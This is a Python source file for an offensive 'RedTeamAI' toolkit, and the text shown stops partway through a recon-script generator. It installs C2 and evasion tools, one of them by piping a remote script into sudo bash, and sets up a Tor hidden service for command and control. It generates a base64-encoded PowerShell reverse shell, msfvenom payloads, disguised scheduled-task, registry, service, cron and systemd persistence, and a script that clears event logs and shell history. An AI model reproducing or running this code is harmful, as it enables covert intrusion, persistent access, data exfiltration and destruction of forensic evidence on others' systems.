import os
import sys
import json
import subprocess
import argparse
from pathlib import Path
import logging
from typing import Dict, List, Optional
import random
import time
import shutil
import hashlib
try:
    import requests
except ImportError:
    print("Warning: 'requests' module not found. Installing it or using fallback.")
    try:
        # Try to install requests
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    except:
        # Define a minimal fallback for requests
        class DummyResponse:
            def __init__(self, status_code=404, text=""):
                self.status_code = status_code
                self.text = text
                self.content = text.encode('utf-8')
                
        class RequestsFallback:
            def get(self, url, *args, **kwargs):
                print(f"Warning: Using fallback requests.get for {url}")
                return DummyResponse()
                
            def post(self, url, *args, **kwargs):
                print(f"Warning: Using fallback requests.post for {url}")
                return DummyResponse()
                
        requests = RequestsFallback()
from datetime import datetime

class RedTeamAI:
    def __init__(self):
        self.base_dir = Path(__file__).parent.parent
        self.config = self.load_config()
        self.setup_logging()
        self.tool_status = {}
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.installer_script = self.base_dir / "install.sh"
        self.menu_script = self.base_dir / "redteam-menu.sh"
        
    def setup_logging(self):
        """Configure OPSEC-compliant logging with anti-forensics"""
        log_dir = self.base_dir / "logs"
        log_dir.mkdir(exist_ok=True)
        
        # Rotating log files with timestamp
        log_file = log_dir / f"toolkit_{self.session_id}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.logger.info(f"🔒 Session started: {self.session_id}")

    def load_config(self) -> dict:
        """Load toolkit configuration"""
        config_file = self.base_dir / "config" / "toolkit_config.json"
        if config_file.exists():
            with open(config_file, 'r') as f:
                return json.load(f)
        return self.create_default_config()

    def create_default_config(self) -> dict:
        """Create default OPSEC configuration with 2024-2025 tools"""
        config = {
            "opsec": {
                "max_concurrent_scans": 3,
                "scan_delay_range": [30, 180],
                "randomize_user_agents": True,
                "proxy_rotation": True,
                "tor_required": True,
                "anti_forensics": True,
                "log_retention_hours": 24
            },
            "tools": {
                "recon": {
                    "amass": {"version": "v4.2.0", "installed": False},
                    "subfinder": {"version": "v2.6.3", "installed": False},
                    "naabu": {"version": "v2.1.9", "installed": False},
                    "rustscan": {"version": "2.1.1", "installed": False},
                    "httpx": {"version": "v1.3.7", "installed": False},
                    "theharvester": {"version": "4.4.4", "installed": False}
                },
                "payloads": {
                    "metasploit": {"version": "6.3.57", "installed": False},
                    "sliver": {"version": "1.5.42", "installed": False},
                    "havoc": {"version": "0.7.0", "installed": False},
                    "scarecrow": {"version": "latest", "installed": False},
                    "donut": {"version": "1.0.3", "installed": False},
                    "greatSCT": {"version": "1.2.7", "installed": False}
                },
                "privesc": {
                    "winpeas": {"version": "latest", "installed": False},
                    "linpeas": {"version": "latest", "installed": False},
                    "beroot": {"version": "latest", "installed": False},
                    "seatbelt": {"version": "1.2.2", "installed": False}
                },
                "c2": {
                    "mythic": {"version": "3.2.0", "installed": False},
                    "chisel": {"version": "1.9.1", "installed": False},
                    "dnscat2": {"version": "0.07", "installed": False}
                },
                "evasion": {
                    "nimcrypt2": {"version": "latest", "installed": False},
                    "pezor": {"version": "latest", "installed": False},
                    "invoke_obfuscation": {"version": "1.8", "installed": False}
                }
            },
            "c2": {
                "preferred_protocols": ["https", "dns", "icmp"],
                "jitter_range": [10, 30],
                "beacon_interval": 3600,
                "domain_fronting": True,
                "tor_hidden_service": True
            },
            "evasion": {
                "av_engines": ["defender", "crowdstrike", "sentinelone", "carbonblack"],
                "obfuscation_levels": ["medium", "high", "maximum"],
                "encryption_keys": self.generate_encryption_keys()
            }
        }
        
        # Save config
        config_dir = self.base_dir / "config"
        config_dir.mkdir(exist_ok=True)
        with open(config_dir / "toolkit_config.json", 'w') as f:
            json.dump(config, f, indent=2)
        
        return config

    def generate_encryption_keys(self) -> dict:
        """Generate unique encryption keys for each engagement"""
        return {
            "aes_key": os.urandom(32).hex(),
            "xor_key": os.urandom(16).hex(),
            "rc4_key": os.urandom(24).hex(),
            "session_key": os.urandom(16).hex()
        }

    def verify_tool_installation(self, tool_name: str, command: str) -> bool:
        """Verify if a tool is properly installed and accessible"""
        try:
            result = subprocess.run([command, "--help"], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=10)
            if result.returncode == 0 or "usage" in result.stdout.lower():
                self.tool_status[tool_name] = "installed"
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
            pass
        
        self.tool_status[tool_name] = "missing"
        return False

    def auto_install_missing_tools(self):
        """Automatically install missing tools with error handling"""
        self.logger.info("🔧 Checking and installing missing tools...")
        
        install_script = self.generate_installation_script()
        script_path = self.base_dir / "temp" / f"auto_install_{self.session_id}.sh"
        
        with open(script_path, 'w') as f:
            f.write(install_script)
        
        os.chmod(script_path, 0o755)
        
        try:
            result = subprocess.run(["/bin/bash", str(script_path)], 
                                  capture_output=True, text=True, timeout=1800)
            if result.returncode == 0:
                self.logger.info("✅ Auto-installation completed successfully")
            else:
                self.logger.error(f"❌ Installation failed: {result.stderr}")
        except subprocess.TimeoutExpired:
            self.logger.error("❌ Installation timeout - check network connectivity")

    def generate_installation_script(self) -> str:
        """Generate comprehensive installation script with error handling"""
        return f"""#!/bin/bash
# AI-Generated Installation Script - Session: {self.session_id}
# Generated: {datetime.now().isoformat()}

set -e
trap 'echo "❌ Installation failed at line $LINENO"' ERR

echo "🚀 Starting automated tool installation..."

# Create directory structure
mkdir -p ~/redteam-toolkit/{{recon,payloads,c2,persistence,evasion,logs,temp,results}}
cd ~/redteam-toolkit

# Function for OPSEC delay
opsec_delay() {{
    sleep $((RANDOM % 60 + 30))
}}

# Function to verify installation
verify_install() {{
    if command -v "$1" >/dev/null 2>&1; then
        echo "✅ $1 installed successfully"
        return 0
    else
        echo "❌ $1 installation failed"
        return 1
    fi
}}

# Update system with error handling
echo "📦 Updating system packages..."
sudo apt update && sudo apt upgrade -y || {{
    echo "⚠️ System update failed, continuing..."
}}

# Install dependencies
echo "🔧 Installing dependencies..."
sudo apt install -y git python3 python3-pip golang-go docker.io tor proxychains4 \\
    build-essential cmake libssl-dev pkg-config wget curl unzip jq \\
    nmap masscan nikto sqlmap gobuster hydra john hashcat \\
    wireshark-common tcpdump net-tools dnsutils || {{
    echo "❌ Dependency installation failed"
    exit 1
}}

# Configure Go environment
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc

echo "📡 Installing Reconnaissance Tools..."

# Amass (latest v4)
echo "Installing Amass..."
go install -v github.com/owasp-amass/amass/v4/...@latest
verify_install "amass"
opsec_delay

# Subfinder  
echo "Installing Subfinder..."
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
verify_install "subfinder"
opsec_delay

# Naabu
echo "Installing Naabu..."
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
verify_install "naabu"
opsec_delay

# RustScan
echo "Installing RustScan..."
wget -q https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb
sudo dpkg -i rustscan_2.1.1_amd64.deb || sudo apt-get install -f -y
verify_install "rustscan"
rm -f rustscan_2.1.1_amd64.deb

# Httpx
echo "Installing Httpx..."
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
verify_install "httpx"

# theHarvester
echo "Installing theHarvester..."
git clone https://github.com/laramies/theHarvester recon/theHarvester
cd recon/theHarvester && pip3 install -r requirements.txt && cd ../..

echo "💥 Installing Payload Generation Tools..."

# Metasploit Framework
echo "Installing Metasploit..."
curl -s https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall
verify_install "msfconsole"

# Sliver C2
echo "Installing Sliver C2..."
curl -s https://sliver.sh/install | sudo bash
verify_install "sliver-server"

# ScareCrow
echo "Installing ScareCrow..."
git clone https://github.com/optiv/ScareCrow payloads/ScareCrow
cd payloads/ScareCrow && go build ScareCrow.go && cd ../..

# Donut
echo "Installing Donut..."
git clone https://github.com/TheWover/donut payloads/donut
cd payloads/donut && make && cd ../..

# Havoc C2
echo "Installing Havoc C2..."
git clone https://github.com/HavocFramework/Havoc c2/Havoc
cd c2/Havoc && make && cd ../..

echo "🔓 Installing Privilege Escalation Tools..."

# PEASS-ng (WinPEAS + LinPEAS)
git clone https://github.com/carlospolop/PEASS-ng persistence/PEASS-ng

# BeRoot
git clone https://github.com/AlessandroZ/BeRoot persistence/BeRoot

# Seatbelt
git clone https://github.com/GhostPack/Seatbelt persistence/Seatbelt

echo "🧠 Installing Credential Access Tools..."

# Impacket
pip3 install impacket

# CrackMapExec  
pip3 install crackmapexec

# Rubeus
git clone https://github.com/GhostPack/Rubeus payloads/Rubeus

# BloodHound
echo "Installing BloodHound..."
wget -q https://github.com/BloodHoundAD/BloodHound/releases/download/4.3.1/BloodHound-linux-x64.zip
unzip -q BloodHound-linux-x64.zip -d c2/
rm BloodHound-linux-x64.zip

echo "📡 Installing C2 Frameworks..."

# Mythic C2
git clone https://github.com/its-a-feature/Mythic c2/Mythic

# Chisel
go install github.com/jpillora/chisel@latest
verify_install "chisel"

# DNScat2
git clone https://github.com/iagox86/dnscat2 c2/dnscat2

echo "🦠 Installing Evasion Tools..."

# Nimcrypt2
git clone https://github.com/icyguider/Nimcrypt2 evasion/Nimcrypt2

# PEzor
git clone https://github.com/phra/PEzor evasion/PEzor

# Invoke-Obfuscation
git clone https://github.com/danielbohannon/Invoke-Obfuscation evasion/Invoke-Obfuscation

echo "👻 Installing Persistence Tools..."

# SharPersist
git clone https://github.com/mandiant/SharPersist persistence/SharPersist

echo "🔒 Configuring OPSEC Infrastructure..."

# Configure Tor
sudo cp /etc/tor/torrc /etc/tor/torrc.backup
echo "HiddenServiceDir /var/lib/tor/c2_service/" | sudo tee -a /etc/tor/torrc
echo "HiddenServicePort 80 127.0.0.1:8080" | sudo tee -a /etc/tor/torrc
echo "HiddenServicePort 443 127.0.0.1:8443" | sudo tee -a /etc/tor/torrc

# Configure ProxyChains
sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.backup
echo "strict_chain" | sudo tee /etc/proxychains4.conf
echo "proxy_dns" | sudo tee -a /etc/proxychains4.conf
echo "tcp_read_time_out 15000" | sudo tee -a /etc/proxychains4.conf
echo "tcp_connect_time_out 8000" | sudo tee -a /etc/proxychains4.conf
echo "[ProxyList]" | sudo tee -a /etc/proxychains4.conf
echo "socks5 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf

echo "🎯 Installing AI Modules..."
pip3 install openai anthropic transformers torch scikit-learn pandas numpy \\
    requests beautifulsoup4 selenium pycryptodome

# Install additional Python tools
pip3 install bloodhound impacket crackmapexec

echo "✅ Installation Complete!"
echo "🔥 RedTeam-AI-Toolkit ready for deployment"
echo "Session ID: {self.session_id}"

# Clean installation files for OPSEC
rm -f msfinstall
find ~/redteam-toolkit -name "*.deb" -delete
find ~/redteam-toolkit -name "*.zip" -delete

echo "🧹 Installation artifacts cleaned for OPSEC compliance"
"""

    def ai_target_analysis(self, target: str) -> Dict:
        """Enhanced AI-assisted target analysis with comprehensive attack planning"""
        self.logger.info(f"🎯 Starting enhanced AI analysis for target: {target}")
        
        analysis = {
            "target": target,
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "reconnaissance_phase": self.plan_advanced_recon_phase(target),
            "attack_vectors": self.identify_advanced_attack_vectors(target),
            "evasion_strategy": self.plan_advanced_evasion_strategy(),
            "c2_deployment": self.plan_advanced_c2_deployment(),
            "persistence_mechanisms": self.plan_persistence_strategy(),
            "exfiltration_strategy": self.plan_exfiltration_strategy(),
            "cleanup_procedures": self.plan_cleanup_procedures()
        }
        
        # Save analysis for future reference
        analysis_file = self.base_dir / "results" / f"analysis_{target}_{self.session_id}.json"
        analysis_file.parent.mkdir(exist_ok=True)
        with open(analysis_file, 'w') as f:
            json.dump(analysis, f, indent=2)
            
        return analysis

    def plan_advanced_recon_phase(self, target: str) -> Dict:
        """Plan comprehensive reconnaissance with multiple tools and OPSEC"""
        return {
            "phase_1_passive": {
                "tools": ["amass", "subfinder", "theHarvester", "shodan"],
                "commands": {
                    "amass": f"proxychains4 amass enum -passive -d {target} -config /etc/amass/config.ini",
                    "subfinder": f"proxychains4 subfinder -d {target} -all -recursive -o subdomains.txt",
                    "theHarvester": f"proxychains4 python3 theHarvester.py -d {target} -b all -f emails.json"
                },
                "delay_between_scans": random.randint(120, 300),
                "proxy_rotation": True,
                "output_format": "json"
            },
            "phase_2_active": {
                "tools": ["naabu", "rustscan", "httpx", "nuclei"],
                "commands": {
                    "naabu": f"naabu -list subdomains.txt -top-ports 1000 -rate 100 -o open_ports.txt",
                    "rustscan": f"rustscan -a {target} --ulimit 5000 -- -sV -sC",
                    "httpx": f"httpx -list subdomains.txt -status-code -tech-detect -o http_services.json"
                },
                "scan_intensity": "stealth",
                "timing_template": "T2",
                "source_port_randomization": True
            },
            "phase_3_enumeration": {
                "tools": ["gobuster", "ffuf", "nikto", "nuclei"],
                "web_enumeration": True,
                "service_enumeration": True,
                "vulnerability_scanning": True
            }
        }

    def identify_advanced_attack_vectors(self, target: str) -> List[Dict]:
        """Advanced attack vector identification with AI-assisted prioritization"""
        vectors = [
            {
                "type": "web_application",
                "tools": ["nuclei", "sqlmap", "gobuster", "burpsuite"],
                "priority": "high",
                "stealth_rating": "medium",
                "success_probability": 0.7,
                "detection_risk": "medium",
                "payloads": ["xss", "sqli", "rce", "lfi"]
            },
            {
                "type": "network_services", 
                "tools": ["metasploit", "nmap_nse", "crackmapexec"],
                "priority": "medium",
                "stealth_rating": "low", 
                "success_probability": 0.5,
                "detection_risk": "high",
                "services": ["smb", "rdp", "ssh", "ftp"]
            },
            {
                "type": "social_engineering",
                "tools": ["gophish", "beef", "setoolkit"],
                "priority": "high",
                "stealth_rating": "high",
                "success_probability": 0.8,
                "detection_risk": "low",
                "techniques": ["phishing", "vishing", "physical"]
            },
            {
                "type": "active_directory",
                "tools": ["bloodhound", "sharphound", "rubeus", "mimikatz"],
                "priority": "critical",
                "stealth_rating": "medium",
                "success_probability": 0.9,
                "detection_risk": "medium",
                "attacks": ["kerberoasting", "asreproasting", "dcsync", "golden_ticket"]
            }
        ]
        return vectors

    def plan_advanced_evasion_strategy(self) -> Dict:
        """Plan comprehensive AV/EDR evasion strategy"""
        return {
            "payload_obfuscation": {
                "primary": "scarecrow",
                "secondary": "donut", 
                "tertiary": "nimcrypt2",
                "encryption": "aes_256_gcm",
                "packing": "upx_custom",
                "code_signing": "self_signed"
            },
            "delivery_methods": {
                "preferred": "dll_sideloading",
                "fallback": "process_hollowing",
                "stealth": "process_doppelganging",
                "persistence": "com_hijacking"
            },
            "anti_analysis": {
                "sandbox_evasion": True,
                "vm_detection": True,
                "debugger_detection": True,
                "sleep_timers": random.randint(30, 120)
            },
            "traffic_evasion": {
                "domain_fronting": True,
                "dns_over_https": True,
                "traffic_mimicry": "legitimate_software",
                "jitter": random.randint(10, 30)
            }
        }

    def plan_advanced_c2_deployment(self) -> Dict:
        """Plan advanced C2 infrastructure with multiple fallback options"""
        return {
            "primary_c2": {
                "framework": "sliver",
                "protocol": "https",
                "domain_fronting": True,
                "tor_hidden_service": True,
                "mtls": True,
                "staging": "multi_stage"
            },
            "backup_c2": {
                "framework": "havoc",
                "protocol": "dns",
                "dns_server": "1.1.1.1",
                "encryption": "aes_256",
                "covert_channel": "dns_txt_records"
            },
            "tertiary_c2": {
                "framework": "mythic",
                "protocol": "icmp",
                "steganography": True,
                "data_exfiltration": "optimized"
            },
            "communication": {
                "beacon_interval": random.randint(3600, 7200),
                "jitter": random.randint(20, 40),
                "killswitch": True,
                "auto_migration": True
            }
        }

    def plan_persistence_strategy(self) -> Dict:
        """Plan persistence mechanisms across different OS platforms"""
        return {
            "windows": {
                "registry": ["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
                "scheduled_tasks": ["system_maintenance", "windows_update"],
                "services": ["legitimate_service_name"],
                "wmi": ["event_consumers", "filters"],
                "com_hijacking": ["legitimate_com_objects"]
            },
            "linux": {
                "cron_jobs": ["system_cleanup", "log_rotation"],
                "systemd_services": ["network_monitor", "system_health"],
                "bashrc_modification": True,
                "ssh_keys": ["authorized_keys_injection"]
            },
            "macos": {
                "launch_agents": ["user_level_persistence"],
                "launch_daemons": ["system_level_persistence"],
                "login_items": ["hidden_applications"],
                "cron_jobs": ["system_maintenance"]
            }
        }

    def plan_exfiltration_strategy(self) -> Dict:
        """Plan data exfiltration strategy with multiple channels"""
        return {
            "methods": {
                "primary": {
                    "channel": "dns_tunneling",
                    "tool": "dnscat2",
                    "encryption": True,
                    "compression": True
                },
                "secondary": {
                    "channel": "https_upload",
                    "service": "legitimate_cloud_storage",
                    "encryption": "client_side"
                },
                "stealth": {
                    "channel": "icmp_tunneling",
                    "tool": "ptunnel",
                    "fragmentation": True
                }
            },
            "data_types": {
                "credentials": "highest_priority",
                "documents": "medium_priority", 
                "databases": "high_priority",
                "system_info": "low_priority"
            },
            "opsec": {
                "file_timestamps": "preserve_original",
                "access_logs": "minimal_footprint",
                "bandwidth_throttling": "5MB_per_hour"
            }
        }

    def plan_cleanup_procedures(self) -> Dict:
        """Plan comprehensive cleanup and anti-forensics procedures"""
        return {
            "file_cleanup": {
                "temp_files": "secure_delete",
                "log_files": "selective_cleaning", 
                "registry_keys": "restore_original",
                "tools": ["sdelete", "wevtutil", "auditpol"]
            },
            "log_manipulation": {
                "windows_eventlog": "clear_security_logs",
                "linux_logs": "rotate_and_compress",
                "application_logs": "selective_deletion"
            },
            "timestamp_manipulation": {
                "file_creation": "randomize_within_range",
                "file_modification": "match_legitimate_files",
                "registry_timestamps": "preserve_system_times"
            },
            "network_cleanup": {
                "connection_logs": "clear_netstat_history",
                "dns_cache": "flush_resolver_cache",
                "arp_tables": "clear_entries"
            }
        }

    def generate_evasive_payload(self, target_os: str, payload_type: str, lhost: str = None, lport: int = None) -> str:
        """Generate advanced evasive payload with multiple obfuscation layers"""
        self.logger.info(f"🔥 Generating advanced evasive payload for {target_os}")
        
        if not lhost:
            lhost = "127.0.0.1"  # Default to localhost
        if not lport:
            lport = random.randint(4444, 9999)
            
        encryption_key = self.config["evasion"]["encryption_keys"]["aes_key"]
        
        payload_script = f"""#!/bin/bash
# AI-Generated Advanced Evasive Payload for {target_os}
# Session: {self.session_id}
# Generated: {datetime.now().isoformat()}

set -e
trap 'echo "❌ Payload generation failed at line $LINENO"' ERR

echo "🔥 Generating multi-layered evasive payload..."

# Create temp directory
TEMP_DIR="/tmp/payload_gen_{self.session_id}"
mkdir -p "$TEMP_DIR"
cd "$TEMP_DIR"

# OPSEC delay
sleep $((RANDOM % 30 + 10))

# Generate base shellcode with Metasploit
echo "🧬 Generating base shellcode..."
if [ "{target_os}" = "windows" ]; then
    msfvenom -p windows/x64/meterpreter/reverse_https \\
        LHOST={lhost} LPORT={lport} \\
        -f raw -o base_shellcode.bin \\
        --encrypt aes256 --encrypt-key {encryption_key[:32]}
else
    msfvenom -p linux/x64/meterpreter/reverse_tcp \\
        LHOST={lhost} LPORT={lport} \\
        -f raw -o base_shellcode.bin \\
        --encrypt aes256 --encrypt-key {encryption_key[:32]}
fi

# Layer 1: Donut conversion
echo "🍩 Applying Donut conversion..."
if [ -f "{self.base_dir}/payloads/donut/donut" ]; then
    {self.base_dir}/payloads/donut/donut \\
        -f base_shellcode.bin \\
        -o donut_shellcode.bin \\
        -a x64 -b 2 -z 2
else
    echo "⚠️ Donut not found, skipping layer 1"
    cp base_shellcode.bin donut_shellcode.bin
fi

# Layer 2: ScareCrow obfuscation  
echo "🦅 Applying ScareCrow obfuscation..."
if [ -f "{self.base_dir}/payloads/ScareCrow/ScareCrow" ]; then
    DOMAIN_FRONTS=("microsoft.com" "google.com" "cloudflare.com" "amazon.com" "github.com")
    RANDOM_DOMAIN="${{DOMAIN_FRONTS[$RANDOM % ${{#DOMAIN_FRONTS[@]}}]}}"
    
    {self.base_dir}/payloads/ScareCrow/ScareCrow \\
        -I donut_shellcode.bin \\
        -Loader dll \\
        -domain "$RANDOM_DOMAIN" \\
        -O {self.base_dir}/payloads/generated/evasive_payload_{self.session_id}.dll \\
        -injection process_hollowing \\
        -sandbox \\
        -nosleep=false
else
    echo "⚠️ ScareCrow not found, generating fallback payload"
    cp donut_shellcode.bin {self.base_dir}/payloads/generated/fallback_payload_{self.session_id}.bin
fi

# Layer 3: Additional obfuscation for Windows
if [ "{target_os}" = "windows" ]; then
    echo "⚡ Generating PowerShell variant..."
    
    # Create obfuscated PowerShell payload
    cat > obfuscated_payload.ps1 << 'EOPSPAYLOAD'
$randomVar1 = "System.Net.Sockets.TCPClient"
$randomVar2 = "{lhost}"
$randomVar3 = {lport}
$randomVar4 = New-Object $randomVar1($randomVar2,$randomVar3)
$randomVar5 = $randomVar4.GetStream()
[byte[]]$randomVar6 = 0..65535|%{{0}}
while(($randomVar7 = $randomVar5.Read($randomVar6, 0, $randomVar6.Length)) -ne 0){{
    $randomVar8 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($randomVar6,0, $randomVar7)
    $randomVar9 = (iex $randomVar8 2>&1 | Out-String )
    $randomVar10 = $randomVar9 + 'PS ' + (pwd).Path + '> '
    $randomVar11 = ([text.encoding]::ASCII).GetBytes($randomVar10)
    $randomVar5.Write($randomVar11,0,$randomVar11.Length)
    $randomVar5.Flush()
}}
$randomVar4.Close()
EOPSPAYLOAD

    # Base64 encode PowerShell payload
    powershell_b64=$(cat obfuscated_payload.ps1 | iconv -t utf-16le | base64 -w 0)
    echo "powershell -w hidden -enc $powershell_b64" > {self.base_dir}/payloads/generated/powershell_payload_{self.session_id}.txt
fi

# Generate persistence script
echo "🔒 Generating persistence mechanisms..."
cat > {self.base_dir}/payloads/generated/persistence_{target_os}_{self.session_id}.txt << 'EOPPERSIST'
# Persistence for {target_os}
# Generated: {datetime.now().isoformat()}

EOPPERSIST

if [ "{target_os}" = "windows" ]; then
    cat >> {self.base_dir}/payloads/generated/persistence_{target_os}_{self.session_id}.txt << 'EOPWINPERS'
# Windows Persistence Mechanisms

# Scheduled Task Persistence
schtasks /create /tn "WindowsUpdateCheck$(($RANDOM % 1000))" /tr "powershell -w hidden -enc <BASE64_PAYLOAD>" /sc onlogon /ru system /f

# Registry Persistence 
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate$(($RANDOM % 1000))" /t REG_SZ /d "C:\\Windows\\System32\\rundll32.exe payload.dll,EntryPoint" /f

# Service Persistence
sc create "WinDefenderService$(($RANDOM % 1000))" binpath= "C:\\Windows\\System32\\svchost.exe -k payload" start= auto
EOPWINPERS
else
    cat >> {self.base_dir}/payloads/generated/persistence_{target_os}_{self.session_id}.txt << 'EOPLNXPERS'
# Linux Persistence Mechanisms

# Cron Job Persistence
echo "*/15 * * * * /tmp/.system_monitor > /dev/null 2>&1" | crontab -

# Systemd Service Persistence
cat > /etc/systemd/system/system-health-monitor.service << EOF
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /tmp/.system_monitor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-health-monitor.service
systemctl start system-health-monitor.service

# Bashrc Persistence
echo 'alias ls="ls --color=auto && /tmp/.system_monitor &"' >> ~/.bashrc
EOPLNXPERS
fi

# Generate cleanup script
echo "🧹 Generating cleanup procedures..."
cat > {self.base_dir}/payloads/generated/cleanup_{self.session_id}.sh << 'EOCLEANUP'
#!/bin/bash
# Automated Cleanup Script
# Session: {self.session_id}

echo "🧹 Starting automated cleanup..."

# Secure file deletion
find /tmp -name "*{self.session_id}*" -exec shred -vfz -n 3 {{}} \\;

# Clear logs
if command -v wevtutil >/dev/null 2>&1; then
    wevtutil cl Security
    wevtutil cl System
    wevtutil cl Application
fi

# Clear bash history
history -c
echo "" > ~/.bash_history

# Clear temp files
rm -rf /tmp/payload_gen_{self.session_id}

echo "✅ Cleanup completed"
EOCLEANUP

chmod +x {self.base_dir}/payloads/generated/cleanup_{self.session_id}.sh

# Clean temporary files
rm -rf "$TEMP_DIR"

echo "✅ Advanced evasive payload generation complete!"
echo "📦 Payloads saved to: {self.base_dir}/payloads/generated/"
echo "🔑 Session ID: {self.session_id}"
echo "🛡️ OPSEC: Multi-layer obfuscation applied"
echo "🔒 Persistence: Mechanisms generated for {target_os}"
echo "🧹 Cleanup: Automated cleanup script ready"
"""

    def run_full_installation(self):
        """Execute the comprehensive installation script"""
        self.logger.info("🚀 Running comprehensive toolkit installation...")
        
        if not self.installer_script.exists():
            self.logger.error("❌ Installation script not found")
            return False
            
        try:
            # Make installer executable
            os.chmod(self.installer_script, 0o755)
            
            # Run installation script
            result = subprocess.run(
                ["/bin/bash", str(self.installer_script)],
                cwd=self.base_dir,
                capture_output=True,
                text=True,
                timeout=3600  # 1 hour timeout
            )
            
            if result.returncode == 0:
                self.logger.info("✅ Full installation completed successfully")
                self.update_tool_status_from_installation()
                return True
            else:
                self.logger.error(f"❌ Installation failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("❌ Installation timeout - process took too long")
            return False
        except Exception as e:
            self.logger.error(f"❌ Installation error: {str(e)}")
            return False

    def update_tool_status_from_installation(self):
        """Update tool status after installation"""
        # Check installed tools
        tools_to_check = {
            "amass": "amass version",
            "subfinder": "subfinder -version", 
            "naabu": "naabu -version",
            "httpx": "httpx -version",
            "rustscan": "rustscan --version",
            "msfconsole": "msfconsole --version",
            "sliver-server": "sliver-server version",
            "chisel": "chisel --version"
        }
        
        for tool, check_cmd in tools_to_check.items():
            if self.verify_tool_installation(tool, check_cmd):
                self.config["tools"]["recon"][tool]["installed"] = True
        
        # Save updated config
        config_file = self.base_dir / "config" / "toolkit_config.json"
        with open(config_file, 'w') as f:
            json.dump(self.config, f, indent=2)

    def generate_automated_recon_script(self, target: str) -> str:
        """Generate AI-optimized reconnaissance script for specific target"""
        self.logger.info(f"🔍 Generating automated recon script for: {target}")
        
        recon_script = f"""#!/bin/bash
# AI-Generated Automated Reconnaissance Script
# Target: {target}
# Session: {self.session_id}
# Generated: {datetime.now().isoformat()}

set -euo pipefail

TARGET="{target}"
OUTPUT_DIR="$HOME/redteam_tools/results/${{TARGET}}_{self.session_id}"
TOOLS_DIR="$HOME/redteam_tools"

echo "🎯 Starting AI-optimized reconnaissance for: $TARGET"
mkdir -p "$OUTPUT_DIR"

# OPSEC delay function
opsec_delay() {{
    sleep $((RANDOM % 60 + 30))
}}

# Phase 1: Passive Information Gathering
echo "📡 Phase 1: Passive reconnaissance..."

# Amass passive enumeration
if command -v amass >/dev/null 2>&1; then
    echo "🔍 Running Amass passive enumeration..."
    proxychains4 amass enum -passive -d "$TARGET" \\
        -config /etc/amass/config.ini \\
        -o "$OUTPUT_DIR/amass_passive.txt" || true
    opsec_delay
fi

# Subfinder enumeration
if command -v subfinder >/dev/null 2>&1; then
    echo "🔍 Running Subfinder enumeration..."
    proxychains4 subfinder -d "$TARGET" -all -recursive \\
        -o "$OUTPUT_DIR/subfinder.txt" || true
    opsec_delay
fi

# theHarvester email harvesting
if [ -d "$TOOLS_DIR/recon/theHarvester" ]; then
    echo "📧 Running theHarvester email enumeration..."
    cd "$TOOLS_DIR/recon/theHarvester"
    proxychains4 python3 theHarvester.py -d "$TARGET" -b all \\
        -f "$OUTPUT_DIR/emails.json" || true
    cd - >/dev/null
    opsec_delay
fi

# Combine and deduplicate subdomains
echo "🔗 Combining subdomain results..."
cat "$OUTPUT_DIR"/amass_passive.txt "$OUTPUT_DIR"/subfinder.txt 2>/dev/null | \\
    sort -u > "$OUTPUT_DIR/all_subdomains.txt" || true

# Phase 2: Active Reconnaissance
echo "🎯 Phase 2: Active reconnaissance..."

# Port scanning with Naabu
if command -v naabu >/dev/null 2>&1 && [ -s "$OUTPUT_DIR/all_subdomains.txt" ]; then
    echo "🔍 Running Naabu port scanning..."
    naabu -list "$OUTPUT_DIR/all_subdomains.txt" \\
        -top-ports 1000 -rate 100 -timeout 3000 \\
        -o "$OUTPUT_DIR/open_ports.txt" || true
    opsec_delay
fi

# HTTP service discovery
if command -v httpx >/dev/null 2>&1 && [ -s "$OUTPUT_DIR/all_subdomains.txt" ]; then
    echo "🌐 Running Httpx service discovery..."
    httpx -list "$OUTPUT_DIR/all_subdomains.txt" \\
        -status-code -tech-detect -title -random-agent \\
        -threads 10 -timeout 10 \\
        -o "$OUTPUT_DIR/http_services.txt" || true
    opsec_delay
fi

# Vulnerability scanning with Nuclei
if command -v nuclei >/dev/null 2>&1 && [ -s "$OUTPUT_DIR/http_services.txt" ]; then
    echo "🔥 Running Nuclei vulnerability scanning..."
    nuclei -list "$OUTPUT_DIR/http_services.txt" \\
        -t cves,vulnerabilities,exposures \\
        -o "$OUTPUT_DIR/nuclei_results.txt" \\
        -rate-limit 10 || true
    opsec_delay
fi

# Additional enumeration for web services
if [ -s "$OUTPUT_DIR/http_services.txt" ]; then
    echo "📂 Running directory enumeration..."
    while IFS= read -r url; do
        if [[ "$url" == http* ]]; then
            gobuster dir -u "$url" -w /usr/share/wordlists/dirb/common.txt \\
                -o "$OUTPUT_DIR/gobuster_$(echo "$url" | sed 's|[^a-zA-Z0-9]|_|g').txt" \\
                -q -t 10 --timeout 10s || true
            sleep 5  # Rate limiting
        fi
    done < "$OUTPUT_DIR/http_services.txt"
fi

# Generate summary report
echo "📊 Generating reconnaissance summary..."
